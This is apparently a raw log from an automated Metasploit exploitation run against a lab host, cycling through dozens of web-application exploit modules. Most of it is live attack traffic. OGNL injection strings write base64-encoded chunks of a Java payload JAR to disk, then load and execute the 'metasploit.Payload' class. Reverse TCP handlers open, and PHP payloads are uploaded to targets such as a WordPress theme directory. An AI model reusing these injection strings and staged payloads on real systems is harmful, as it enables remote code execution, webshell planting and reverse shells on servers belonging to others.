[*] [2016.06.04-09:49:42] [0324] Attempting to execute: #f=new java.io.FileOutputStream('pjHz8Ix.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('FW/GW1QcwltV/C5+j7ypJsa2VvH7eAtCae04spq44aj4A7xNxR/i7SruYh6UcQOouBteJgSX2H3GAKlVrHF6+1QchldVvAPvJLXn60DFHzEBsSaeSJM8mFFxBO/k1agKz8HzKt6Fd5NnriDJ+sx4Ppkx5vgevBfBH/VI4dFEHO+T8Mcq3o8PqPggPqTiT/CnCCWTBdiDD6v4CPPjW7umGQGI5R7H6bMjKj6KjyEcMVV/Hel+22kxUsZGM+3pB0H/mLui+sZoO60GrDTp/pA8hHTRmIqlt7iRlwMvL3g6K19d+UHCSvqZio/jExI+qeJT+DSFw2T7kmr5SIWX2ChKtYu0z3B6VHwGfy7hL1T8JT6r4nP4rISk7V/hCyq+CM+o8CQ8gVBsm05+bJVOygUS/lrFl/BlFX+Dr0wg37bhfPJrFV/F1yR8XcU38E2EQ8fvW61of6ynxXR6rPj+HESmjPX0WqQsoXJQxd/iXtLK+Jv9cCr+jr3O39zetqaDRFxC')),#f.close()
[*] [2016.06.04-09:49:42] [0324] Attempting to execute: #f=new java.io.FileOutputStream('pjHz8Ix.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('f7xd1RalyvV7Fd/CP6j4Nv6R7tLGQARhbk6Ly7c4Zn06bWzJS0Iq/gkfIu00Rduqly497oTqY1R8B//MCn43568p06klR1HxL/jeBFvWFHAAFd/HD8ih+m1zpUXpZEY+igYrlSLVuGL8FZ9FmDeFt3wz55TOr6NWbJPpMF9/QwiNH5vpzWZ6/PLvKv4D/6niv/Df5D95rE5wMPLPAcrMHhU7p+iJ6TmXXSblZwLOT02erSk16eOpyHO/DmuTmaJ0SDooyuppfnX1fJIp6pCi2o20QeyZaSKP85n1/6j4Ie5V8SPOCsW5UuQCq/Ai/JrgalXcJ4AqoCDkEhqxt8JwjHyTEq7bcwxRhu2nyraltt1M91LC9ardnIl39cnk+LUq+ASRzDzpedpyPMutsLy6OmsiANfcqNWfjlGoyN0Ur5Ha2topaGKUomsbOE93J2KGQ4I9Lfh5CKiCRMILMr6rCkFBUYUiQaVMzs/7PO3V2KyKGlUoFkrI42mXdiZZY3+h')),#f.close()
[+] [2016.06.04-09:49:43] Workspace:lab5 Progress:329/775 (42%) [325/770] 10.198.0.1:80 - Visual Mining NetCharts Server Remote Code Execution
[-] [2016.06.04-09:49:43] No reverse connect payloads available for exploit/multi/http/visual_mining_netcharts_upload
[-] [2016.06.04-09:49:43] No payloads were compatible with exploit/multi/http/visual_mining_netcharts_upload)
[-] [2016.06.04-09:49:43] [0325] Exploit failed: A payload has not been selected.
[*] [2016.06.04-09:49:43] [0324] Attempting to execute: #f=new java.io.FileOutputStream('pjHz8Ix.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('yIucjp60NeCF8H4ztxPYuLaEUgoqoUyFx+EJFZ4CyoC+WrtHhVfgVYqi2g2JlAq/4SQi1piDxPNr8LoqTOMEWppvdSO2SYU34E1V0PBuVSiHx1RhOkMhMR0SZlBo19BqJss5i2WYMbUkdXdTCAm6MJuKkTBHFeYK83h1iCocKsynYBUOU4UFwuF8doQqHMmoFgpH8W2YSqpl16TIqyRhkSpUCJWqUCVUq/AoS1TCma/GNvvI7xyLCs7PXDmNxCDxx/WbeanpsXrNXHiNp7pm0j778bz8fNxqOSut/lR+BhsPo7a8U4n6lFaD8U4PF2xGpLTZlzTYcWaEGxoKggQMKoEpSo7VB9XhZEs7dwyOlasG5cTHGtN2fbTezkXzoo/tVfLbNTK/10nMKtzOcU/mjyUtmwQpIlrZjmQL6T5GAI7ZYfb2eZ1lIG4mKfbdhpWa2lKCrt9gW8l+h/KC00MWCBfu+fy9m+LcpB0enthOFYYOpM1ea/PkvjCbshYVymLc')),#f.close()
[*] [2016.06.04-09:49:43] [0324] Attempting to execute: #f=new java.io.FileOutputStream('pjHz8Ix.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('UzYYKStF0Zn0WPGRhAhLC2A4SJxL/5+GcqLZp42fNaUccyM7oUwebJu0PYCWmsihNhvJfrOtmyGaCiIusvPt8/9zuF+4Yja0kTZTjmfZsvCURjfg2oyyruKmLLszcUALky9MC0/+onBznZUm5JXhg/1k4Fd5ylvTn3ISHIEKx0BuE5oQjtljdnNKcjGEcMEPp7wjUmDMpI+iCaSyh+T0RGpCOZ0ZPlBcMWhjOm2lc6BlE9K3yUHnt5OmSd9SYvg0Fk71Iqgt1TiYcCYwsNyykqbB3XdHVzt9HE6b8hFHyY4Iev0XwifCH//F5b3JlzttdifJ+rUeBlZYx5q1RKm8eQoXy3J1ssBD8oxEajN1CQgnFIiudQcZXtKAkXDcVouSCTl/aZ9X3KgadaTdrJrfGW+xHZMULHAFDx3AHD6LI378Nq9asu7s/g12NqXKpEfu3GxO3YU+4paT4cLrlrPFSijaUuMNIMLsnD9MaQ5Zqm4r7RWNI/9Hxs/ZVGH8OQcq')),#f.close()
[+] [2016.06.04-09:49:43] Workspace:lab5 Progress:330/775 (42%) [326/770] 10.198.0.1:80 - Lexmark MarkVision Enterprise Arbitrary File Upload
[-] [2016.06.04-09:49:43] No reverse connect payloads available for exploit/windows/http/lexmark_markvision_gfd_upload
[-] [2016.06.04-09:49:43] No payloads were compatible with exploit/windows/http/lexmark_markvision_gfd_upload)
[-] [2016.06.04-09:49:43] [0326] Exploit failed: A payload has not been selected.
[*] [2016.06.04-09:49:43] [0324] Attempting to execute: #f=new java.io.FileOutputStream('pjHz8Ix.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('xE2T+9tA2J0CRozrE9ksnwmvjVzmJeSJTd+sPOedEHuFP18LR2RRjAqm4zaGNn8xm4Pehlt1z8lZV2RDv/trBGmB9k0uwz76YKcCnCVVoKtzCSwOT9BozocO2H65j+onIx1v5ZYdkFyDlUxmjcU4JObfzclBXq3sTyYprxbFze5EymzwvuaaCgUaidf88Z1mQWOraSrkyc051NOn/lLj6jtlDjSlKOumYlO6j/HG/QBJlRHkVfr8IHA9yBxM2A7RFvv67R4Oi1xrRUWhx7BbKGPnLB0wL+g3kvakpJ8Lakr6ou3+buLrs/rcD88spoYeg7BhAzXs4YZCXQ53ixySlAt7qQTVO1Mq3n4xq/5HCzAJpZRIxc1BLqEcMU0cUU0HKKWOxXy6H28MvWgd8Tu3ML+5riyQNFMbuQoGYvzU8ag0cAA0udTKxvvqZotaEY6FxtZTm5uiq/b/YJh367HRbA2Y6QbDzmt48mEKcA+HgQiPAIAfZnObTKvZ3Bi7M30N')),#f.close()
[*] [2016.06.04-09:49:44] [0324] Attempting to execute: #f=new java.io.FileOutputStream('pjHz8Ix.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('uPOT2fkp91wB5N+eaPw57abRjPy+YgRwt/v7dxB+Ab8Ega/FLRAgEBDPGQOhawR8zeUgtoyBn9aBqgxIZTVltRmQMxDUFBoyUNRapakZKI6IurgHSip1MQMlPJRWamUZmBbx6/49cJ6maeWjMD0S0AMZCHWOwYyuLFY+mMn4Znn4RkCPSLqUgdkulC7p/hGYE5GrdL8uj8JcF+28zkrtEJ3YODQD82l9mLYgA4ePwhF1AbpgslIocAOeSzehgBgfhSMzsLAzx4TMLycyIU9lIuiSD2pHMXnF21TzukgvykA4A4s6q6r1IpelCq2S6GukoeptMLNKq3HBGUyrpScuzNFIIHv49pjx28Xe7Rgc26UrI7AkolbqKiM7Tiet1o3C8dK9sLTLp50wCpFol6gti3b5dWJxZrTLNUg0AydGivXiDJxEOuf5ZJqnwymjUE9PZ3T59CJ651Ljpwq904PRSImvrjRUqpfctwOO89WVhcrKlB1wpF4SKl1MutkGgSGY')),#f.close()
[+] [2016.06.04-09:49:44] Workspace:lab5 Progress:331/775 (42%) [327/770] 10.198.0.1:8080 - SugarCRM unserialize() PHP Code Execution
[*] [2016.06.04-09:49:44] [0324] Attempting to execute: #f=new java.io.FileOutputStream('pjHz8Ix.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('md0tnw4NhG1rGQ7te3FrKY2PDgkn69IeuNqzEGtLHobG62B1OczQVor3wqldvmFYRcw16TJtT+Pt6bRt7hyCBZEgyRXw5GplodqYM1eUDLQThBIJsoxrCEx0wbzLTpeG5lmPxzAvhnC4UotqHVkHkCu1tazpSJDM4i6UkLwdyobhjEjRMHRG1CF4QFf2wGW6op3pGmz2GHSR+snnztLWZeDsETgnUjQEawnAs+hJY3Cua5/1GTgvUqwZo7BBi3lilkOcxURPSr3YFZLtYDKOaXkvuyNFY7CR3K2HeThJD+6B8jFIkFuF5BE4P1I8xJxs6uJdMlKil2Sgl0xLU4rxWeR4NPWRi3i+xGbfAx3aBcxNOpDlxiaFloNDGi2HpS5nAY8z1w1U1rTL4/3QT/+YjG/x/WAT8hKRFk5EHYPNubjQBigeKrVB17290NC2jMCFHncXkW0ipa736KXkSOV6Ka3o4uKo6yxvj4FIWD6pF+nE8yXMs146Ap/aDYJwvNAl')),#f.close()
[+] [2016.06.04-09:49:44] Workspace:lab5 Progress:332/775 (42%) [328/770] 10.198.0.1:8080 - Tiki Wiki unserialize() PHP Code Execution
[*] [2016.06.04-09:49:44] [0324] Attempting to execute: #f=new java.io.FileOutputStream('pjHz8Ix.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('nA0tNF8kXAKrKQ09S/9Fyk2rKWM9B897CQnW0plEc1NFjqVLmSWPF8o7rRw6VRw54rQyuEeO+Kt1fwY+3VUXEG6EMl3U/b4QpZjLhva9xWmpzst5TCxAJH4FL4DGv1Vlyb1PxIpofmUMLu+qHIGtEf8YXEF0r+SkNAZX0fIzGfjsGFxNOrqmi82rfY7M67sXPj8CX+Bg+GJErn4YTmA2vlQXDAWJKYWSF+XLL1dUoK74QkF23q90RYivr+4H277v+SGYk5PyayRhtSclmdfLm1+nsAho38hZ+vI8S3/TDbVg1tR+uqliS4vZkNM4DY/BNtbUdRn41m63BjxOFeLaSZp/CV7OVoqzSCUCza3YPAzXb4N5WdaGYTtnyhs85ipG4cbmyocn396Uf7sHZDLYzF20+/YuV/0K/zqVpVNJVJibQ7MYKugpBfo2kLUdQ+DXsrbOPXwFXs0+XExMizQvJLzfacFWitWd20DnnFRVSaQotbaSCndeB35src69fw1e')),#f.close()
[*] [2016.06.04-09:49:45] [0328] Started reverse TCP handler on 0.0.0.0:1221
[*] [2016.06.04-09:49:45] [0328] Disclosing the path of the Tiki Wiki on the filesystem
[*] [2016.06.04-09:49:45] [0324] Attempting to execute: #f=new java.io.FileOutputStream('pjHz8Ix.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('z76/i14HaL5tDG4mwrc0E56hlsoqH+W8Wzs5CqrExcPwXfJ3xvO9bdBA08URUfs+e9IPOEnue0u7LbuZS4z+0L8DVGaAqqu+iw5u52zmFsVbO4f23TMGu4jS7ojoq/OH/PxgBxwR8os7QdXFYRjOwB2dulgZIp+4MwM/6tzqpzB6wc2yhCLDSLNivAFvemJgkMSQ6exDen9iRVntHKrPZWfzeDq2VJRFMjBy8rwb4EpXp5fOE8+rEyt8IUI32kKqvosdPFfeg/TqbtJ1i+4PiUvm3ARKSBTPIyOExDoxx3uANlKIyjJFfJgAJQYs4YUYXzLnRloG3FOWZatE/D/Hvps5fQhWE70xkvWUCqJ+D72qq5hDkt5LDM1hQu4yJPp3QilzyAejQyBWtFQQb2OUnQlHMRmkhd+fdbrfLQ3k52JF1FOLDL/d3+jUu84LcJx23yj8eBjuz8ADd8CD2kO0uwN+ov10GB4ku90B1w/Tbo+7bNQedm+3e0kC/gtQSwME')),#f.close()
[-] [2016.06.04-09:49:45] [0328] Tiki Wiki path couldn't be disclosed. The php setting 'display_errors' must be On.
[*] [2016.06.04-09:49:45] [0324] Attempting to execute: #f=new java.io.FileOutputStream('pjHz8Ix.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('FAAAAAAAJ07ESAAAAAAAAAAAAAAAAAkAAABNRVRBLUlORi9QSwMEFAAAAAgAJ07ESH6aFUZiAAAAkQAAABQAAABNRVRBLUlORi9NQU5JRkVTVC5NRvNNzMtMSy0u0Q1LLSrOzM+zUjDUM+Dl8k3MzNN1zkksLrZSyE0tSSwuyMnPLNELSKzMyU9M4eUKSC3KzSwGaQAqSMzJ0S1ACPBy8XL5JeamouhMSSzBJq4PNVEvGWQXSAUAUEsBAhQAFAAAAAgAJ07ESAP5NTEjAAAAJAAAAA4AAAAAAAAAAAAAAAAAAAAAAG1ldGFzcGxvaXQuZGF0UEsBAhQAFAAAAAAAJ07ESAAAAAAAAAAAAAAAAAsAAAAAAAAAAAAAAAAATwAAAG1ldGFzcGxvaXQvUEsBAhQAFAAAAAgAJ07ESHB7Ld9OEQAAQSEAABgAAAAAAAAAAAAAAAAAeAAAAG1ldGFzcGxvaXQvUGF5bG9hZC5jbGFzc1BLAQIUABQAAAAAACdO')),#f.close()
[*] [2016.06.04-09:49:45] [0324] Attempting to execute: #f=new java.io.FileOutputStream('pjHz8Ix.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('xEgAAAAAAAAAAAAAAAAJAAAAAAAAAAAAAAAAAPwRAABNRVRBLUlORi9QSwECFAAUAAAACAAnTsRIfpoVRmIAAACRAAAAFAAAAAAAAAAAAAAAAAAjEgAATUVUQS1JTkYvTUFOSUZFU1QuTUZQSwUGAAAAAAUABQA0AQAAtxIAAAAA')),#f.close()
[*] [2016.06.04-09:49:46] [0324] Attempting to execute: #q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdkChecked'),#q.setAccessible(true),#q.set(null,true),#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdk15'),#q.setAccessible(true),#q.set(null,false),#cl=new java.net.URLClassLoader(new java.net.URL[]{new java.io.File('pjHz8Ix.jar').toURI().toURL()}),#c=#cl.loadClass('metasploit.Payload'),#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.String;')}).invoke(null,new java.lang.Object[]{new java.lang.String[0]})
[+] [2016.06.04-09:49:47] Workspace:lab5 Progress:333/775 (42%) [329/770] 10.198.0.1:80 - WordPress Holding Pattern Theme Arbitrary File Upload
[*] [2016.06.04-09:49:48] [0329] Started reverse TCP handler on 0.0.0.0:1222
[*] [2016.06.04-09:49:48] [0329] Preparing payload...
[*] [2016.06.04-09:49:48] [0329] Uploading payload...
[*] [2016.06.04-09:49:48] [0329] Executing the payload at /wp-content/themes/holding_pattern/uploads/tzguphkwdx.php
[+] [2016.06.04-09:49:49] Workspace:lab5 Progress:334/775 (43%) [330/770] 10.198.0.1:8080 - appRain CMF Arbitrary PHP File Upload Vulnerability
[*] [2016.06.04-09:49:49] [0330] Started reverse TCP handler on 0.0.0.0:1223
[*] [2016.06.04-09:49:49] [0330] Sending PHP payload (jWxdQfzEAPSWt.php)
[-] [2016.06.04-09:49:49] [0330] File wasn't uploaded, aborting!
[!] [2016.06.04-09:49:50] [0329] This exploit may require manual cleanup of 'tzguphkwdx.php' on the target
[+] [2016.06.04-09:49:51] Workspace:lab5 Progress:335/775 (43%) [331/770] 10.198.0.1:80 - ElasticSearch Search Groovy Sandbox Bypass
[*] [2016.06.04-09:49:51] [0331] Started reverse TCP handler on 0.0.0.0:1224
[*] [2016.06.04-09:49:51] [0331] Checking vulnerability...
[*] [2016.06.04-09:49:51] [0331] Trying to get a reference to java.lang.Runtime...
[-] [2016.06.04-09:49:51] [0331] Target answered with HTTP code 302 (with a body)
[*] [2016.06.04-09:49:51] [0331] no response to test
[-] [2016.06.04-09:49:51] [0331] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Java has not been executed, aborting...
[+] [2016.06.04-09:49:51] Workspace:lab5 Progress:336/775 (43%) [332/770] 10.198.0.1:80 - Symantec Endpoint Protection Manager Authentication Bypass and Code Execution
[*] [2016.06.04-09:49:51] [0332] Started reverse TCP handler on 0.0.0.0:1225
[*] [2016.06.04-09:49:51] [0332] Getting cookie...
[-] [2016.06.04-09:49:52] [0332] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=SSLv2/v3 read server hello A: unknown protocol
[+] [2016.06.04-09:49:52] Workspace:lab5 Progress:337/775 (43%) [333/770] 10.198.0.1:8080 - LANDesk Lenovo ThinkManagement Console Remote Command Execution
[*] [2016.06.04-09:49:52] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:49:52] [0333] Started reverse TCP handler on 0.0.0.0:1226
[+] [2016.06.04-09:49:53] Workspace:lab5 Progress:338/775 (43%) [334/770] 10.198.0.1:80 - Maarch LetterBox Unrestricted File Upload
[*] [2016.06.04-09:49:53] [0333] Uploading 101572 bytes through /landesk/managementsuite/core/core.anonymous/ServerSetup.asmx...
[*] [2016.06.04-09:49:53] [0334] Started reverse TCP handler on 0.0.0.0:1227
[*] [2016.06.04-09:49:53] [0334] Preparing payload...
[*] [2016.06.04-09:49:53] [0334] Uploading payload...
[*] [2016.06.04-09:49:53] [0334] Parsing server response...
[-] [2016.06.04-09:49:53] [0334] Exploit failed: NoMethodError undefined method `captures' for nil:NilClass
[-] [2016.06.04-09:49:53] [0333] Upload failed on /landesk/managementsuite/core/core.anonymous/ServerSetup.asmx [404 Not Found]
[+] [2016.06.04-09:49:53] Workspace:lab5 Progress:339/775 (43%) [335/770] 10.198.0.1:8080 - WebCalendar 1.2.4 Pre-Auth Remote Code Injection
[-] [2016.06.04-09:49:53] No reverse connect payloads available for exploit/linux/http/webcalendar_settings_exec
[-] [2016.06.04-09:49:53] No payloads were compatible with exploit/linux/http/webcalendar_settings_exec)
[-] [2016.06.04-09:49:53] [0335] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:49:54] Workspace:lab5 Progress:340/775 (43%) [336/770] 10.198.0.1:8080 - PHP CGI Argument Injection
[*] [2016.06.04-09:49:54] [0336] Started reverse TCP handler on 0.0.0.0:1228
[+] [2016.06.04-09:49:57] Workspace:lab5 Progress:341/775 (44%) [337/770] 10.198.0.1:80 - PHPMoAdmin 1.1.2 Remote Code Execution
[*] [2016.06.04-09:49:57] [0337] Started reverse TCP handler on 0.0.0.0:1229
[*] [2016.06.04-09:49:57] [0337] Executing payload...
[+] [2016.06.04-09:49:59] Workspace:lab5 Progress:342/775 (44%) [338/770] 10.198.0.1:8080 - Avaya IP Office Customer Call Reporter ImageUpload.ashx Remote Command Execution
[*] [2016.06.04-09:49:59] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:49:59] [0338] Started reverse TCP handler on 0.0.0.0:1230
[*] [2016.06.04-09:50:00] [0338] Uploading 63096 bytes through /CCRWebClient/Wallboard/ImageUpload.ashx...
[-] [2016.06.04-09:50:00] [0338] Payload upload failed
[+] [2016.06.04-09:50:16] Workspace:lab5 Progress:343/775 (44%) [339/770] 10.198.0.1:8080 - Active Collab "chat module" Remote PHP Code Injection Exploit
[+] [2016.06.04-09:50:17] Workspace:lab5 Progress:344/775 (44%) [340/770] 10.198.0.1:80 - Solarwinds Firewall Security Manager 6.6.5 Client Session Handling Vulnerability
[*] [2016.06.04-09:50:17] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:50:17] [0340] Started reverse TCP handler on 0.0.0.0:1232
[-] [2016.06.04-09:50:17] [0340] Exploit aborted due to failure: not-vulnerable: Target does not appear to be a Solarwinds Firewall Security Manager
[+] [2016.06.04-09:50:17] Workspace:lab5 Progress:345/775 (44%) [341/770] 10.198.0.1:8080 - Linksys Devices pingstr Remote Command Injection
[-] [2016.06.04-09:50:17] No reverse connect payloads available for exploit/linux/http/linksys_wrt110_cmd_exec
[-] [2016.06.04-09:50:17] No payloads were compatible with exploit/linux/http/linksys_wrt110_cmd_exec)
[-] [2016.06.04-09:50:17] [0341] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:50:18] Workspace:lab5 Progress:346/775 (44%) [342/770] 10.198.0.1:80 - Accellion FTA getStatus verify_oauth_token Command Execution
[-] [2016.06.04-09:50:18] No reverse connect payloads available for exploit/linux/http/accellion_fta_getstatus_oauth
[-] [2016.06.04-09:50:18] No payloads were compatible with exploit/linux/http/accellion_fta_getstatus_oauth)
[-] [2016.06.04-09:50:18] [0342] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:50:18] Workspace:lab5 Progress:347/775 (44%) [343/770] 10.198.0.1:8080 - vTigerCRM v5.4.0/v5.3.0 Authenticated Remote Code Execution
[*] [2016.06.04-09:50:19] [0343] Started reverse TCP handler on 0.0.0.0:1233
[+] [2016.06.04-09:50:22] Workspace:lab5 Progress:348/775 (44%) [344/770] 10.198.0.1:80 - SysAid Help Desk Administrator Portal Arbitrary File Upload
[*] [2016.06.04-09:50:22] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[+] [2016.06.04-09:50:23] Workspace:lab5 Progress:349/775 (45%) [345/770] 10.198.0.1:8080 - Zabbix Authenticated Remote Command Execution
[-] [2016.06.04-09:50:23] No reverse connect payloads available for exploit/multi/http/zabbix_script_exec
[-] [2016.06.04-09:50:23] No payloads were compatible with exploit/multi/http/zabbix_script_exec)
[-] [2016.06.04-09:50:23] [0345] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:50:23] Workspace:lab5 Progress:350/775 (45%) [346/770] 10.198.0.1:8080 - ISPConfig Authenticated Arbitrary PHP Code Execution
[*] [2016.06.04-09:50:23] [0346] Started reverse TCP handler on 0.0.0.0:1235
[-] [2016.06.04-09:50:24] [0346] Exploit aborted due to failure: unexpected-reply: Error getting initial page.
[+] [2016.06.04-09:50:24] Workspace:lab5 Progress:351/775 (45%) [347/770] 10.198.0.1:80 - SysAid Help Desk 'rdslogs' Arbitrary File Upload
[*] [2016.06.04-09:50:24] [0347] Started reverse TCP handler on 0.0.0.0:1236
[*] [2016.06.04-09:50:24] [0347] Creating upload directory
[*] [2016.06.04-09:50:24] [0347] Uploading WAR file...
[-] [2016.06.04-09:50:24] [0347] Exploit aborted due to failure: unknown: 10.198.0.1:80 - WAR upload failed
[+] [2016.06.04-09:50:25] Workspace:lab5 Progress:352/775 (45%) [348/770] 10.198.0.1:8080 - OpenMediaVault Cron Remote Command Execution
[-] [2016.06.04-09:50:25] No reverse connect payloads available for exploit/multi/http/openmediavault_cmd_exec
[-] [2016.06.04-09:50:25] No payloads were compatible with exploit/multi/http/openmediavault_cmd_exec)
[-] [2016.06.04-09:50:25] [0348] 10.198.0.1:8080 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:50:25] Workspace:lab5 Progress:353/775 (45%) [349/770] 10.198.0.1:80 - Ruby on Rails Web Console (v2) Whitelist Bypass Code Execution
[-] [2016.06.04-09:50:25] No reverse connect payloads available for exploit/multi/http/rails_web_console_v2_code_exec
[-] [2016.06.04-09:50:25] No payloads were compatible with exploit/multi/http/rails_web_console_v2_code_exec)
[-] [2016.06.04-09:50:25] [0349] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:50:26] Workspace:lab5 Progress:354/775 (45%) [350/770] 10.198.0.1:8080 - Apache Roller OGNL Injection
[*] [2016.06.04-09:50:26] [0350] Started reverse TCP handler on 0.0.0.0:1237
[*] [2016.06.04-09:50:26] [0350] Checking injection...
[!] [2016.06.04-09:50:26] [0350] Target not found as vulnerable, trying anyway...
[*] [2016.06.04-09:50:26] [0350] Attempting to execute: #f=new java.io.FileOutputStream('xwXSls.jar'+#a,false),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('UEsDBBQAAAAIAFpOxEjjADKsIwAAACQAAAAOAAAAbWV0YXNwbG9pdC5kYXQLLkgsz7M14vLx8A8OsTU00DO0tNAz0AMKBPgHAQWMjM25AFBLAwQUAAAAAABaTsRIAAAAAAAAAAAAAAAACwAAAG1ldGFzcGxvaXQvUEsDBBQAAAAIAFpOxEhwey3fThEAAEEhAAAYAAAAbWV0YXNwbG9pdC9QYXlsb2FkLmNsYXNzlRgJeBTl9b3Z2Z3ZyeRgwgLDoYiKS05FjLh4NIQg0VywwRhRcdidkJXNTtyZkKDWWkVttfcpVtRSNPawQrSbaNR6tHjUs61ardaztNbWWrV3lb43s0s2yWJpPvjP97/7mn3so7vvA4BjhBoFHoG9EvxOAYHn30vwlgJ+2KvAqfAHBZbC27z9owx/4vkdGf7MN+8y+F8UsOE9Gd7nzQcy/FWGvykwA/7Owz8k+CfP/5Lh3zz/h4cPefhIARH20RsEGZFOUOCNT0ZRRj8vAwpKKBNx')),#f.close(),#a='7QI'
[*] [2016.06.04-09:50:26] [0350] Attempting to execute: #f=new java.io.FileOutputStream('xwXSls.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('DPJWkbGIwVQeimUskbFUxjK+nyajJmO5jNNlDMk4Q8KZChyLs/iZTit4T8HZOEfCuTLOI7p4iIyH8tF8BQ/DBTwc7gf3T3pawSPwSKaxMHsE8SA9OUrGsISLgliBlSQ7VklYzZsaBWvxaAmPkXGxjMcyriUSHqfAaqyT8XgZl8p4QhAjuIyHE2U8ScKTmelTZPwEz/UKdOFyCRsUOJf1cy6ukLGRSayU8VQJVykQJx7pvEnC0xTYSAbC0xVIYLOELQpswlYe2mggOel4AQ/tMq6WcY2EUQk7JFwr4Rkydsp4poxdCmzGs3hYx8PZbIi9Mp7DijlXxvVkTzyP9WdIuEGByzEmYVyBK5iuqcBV7BVXYLeEGyXskTEh4fkKXIObFLgakwzfy0OK0Vk89Ml4AYuTltGW0JGwX8LNCmzDAQWuxUFW7hYeLpTxIoa/WMZP8nyJjJ/i+VI2xqclvEyBm5m2iJfTCrcG6fgKluBKGa9iTX5Gxs/yzdU8XCPh5xTY')),#f.close(),#a='7QI'
[+] [2016.06.04-09:50:26] Workspace:lab5 Progress:355/775 (45%) [351/770] 10.198.0.1:80 - ProFTPD 1.3.5 Mod_Copy Command Execution
[-] [2016.06.04-09:50:26] No reverse connect payloads available for exploit/unix/ftp/proftpd_modcopy_exec
[-] [2016.06.04-09:50:26] No payloads were compatible with exploit/unix/ftp/proftpd_modcopy_exec)
[-] [2016.06.04-09:50:26] [0351] 10.198.0.1:80 - Exploit failed: A payload has not been selected.
[*] [2016.06.04-09:50:26] [0350] Attempting to execute: #f=new java.io.FileOutputStream('xwXSls.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('BXsZ7PO0wi/w8Rd59SW+eIeffJmHr/DwVXJs/Bqvvs7DN3j4pozXKhiBD4K4Da/jk28xo9fLuJ3nG2S8UcabZPy2hDsQpLbo+tb6lkYErfl8Y7NRmzRSG2ujTjqR2riMvLy9vmPV+mhjO0KgKbq+vulMBDzL26xoiyIET6s/o379qjbGEDgxkUo4JyP4wovOQBAbrLhJU6+RSCHMCK+bSoDBlMbBmNnnJKyUjTBtIJ1wzMbeDWY8bsZXJpKEYEk472FD0rDtZVMxeScJq5bfEF4JvyPhTuJvg2U5tpM2+hCi4f1QTam+foeemkbv+NO2fmfyaT6JA/BfttF0TkubjYNmrN8xNjDHC8MFQAupVzXi8cZBx0zZJD4x251IxZtSKxLpSVJPELIA1pzchCJlpXuNZOJCYmNB+CAeSPGEbZsxB+GoQuDrCnrFibGka2oVnoZnEKa7MP1OIlnbnrb6zLSTMMmYWq/pGHZf0ko4te3GlqRlxBFmTsa3vD+RjJtp')),#f.close(),#a='7QI'
[*] [2016.06.04-09:50:27] [0350] Attempting to execute: #f=new java.io.FileOutputStream('xwXSls.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('FW/GW1QcwltV/C5+j7ypJsa2VvH7eAtCae04spq44aj4A7xNxR/i7SruYh6UcQOouBteJgSX2H3GAKlVrHF6+1QchldVvAPvJLXn60DFHzEBsSaeSJM8mFFxBO/k1agKz8HzKt6Fd5NnriDJ+sx4Ppkx5vgevBfBH/VI4dFEHO+T8Mcq3o8PqPggPqTiT/CnCCWTBdiDD6v4CPPjW7umGQGI5R7H6bMjKj6KjyEcMVV/Hel+22kxUsZGM+3pB0H/mLui+sZoO60GrDTp/pA8hHTRmIqlt7iRlwMvL3g6K19d+UHCSvqZio/jExI+qeJT+DSFw2T7kmr5SIWX2ChKtYu0z3B6VHwGfy7hL1T8JT6r4nP4rISk7V/hCyq+CM+o8CQ8gVBsm05+bJVOygUS/lrFl/BlFX+Dr0wg37bhfPJrFV/F1yR8XcU38E2EQ8fvW61of6ynxXR6rPj+HESmjPX0WqQsoXJQxd/iXtLK+Jv9cCr+jr3O39zetqaDRFxC')),#f.close(),#a='7QI'
